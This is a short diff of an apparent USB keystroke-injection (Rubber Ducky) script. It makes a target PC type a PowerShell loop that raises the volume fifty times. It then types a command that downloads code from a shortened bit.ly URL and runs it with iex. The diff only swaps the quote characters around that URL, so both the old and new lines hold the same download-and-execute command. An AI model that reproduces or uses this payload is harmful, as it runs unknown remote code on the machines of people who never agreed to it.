@@ -9,5 +9,5 @@ DELAY 2000
 STRING for ($i=0; $i -lt 50; $i++) { (new-object -com wscript.shell).SendKeys([char]175) }
 ENTER
 DELAY 2000
-STRING iex (New-Object Net.WebClient).DownloadString("http://bit.ly/e0Mw9w")
+STRING iex (New-Object Net.WebClient).DownloadString(@http://bit.ly/e0Mw9w@)
 ENTER
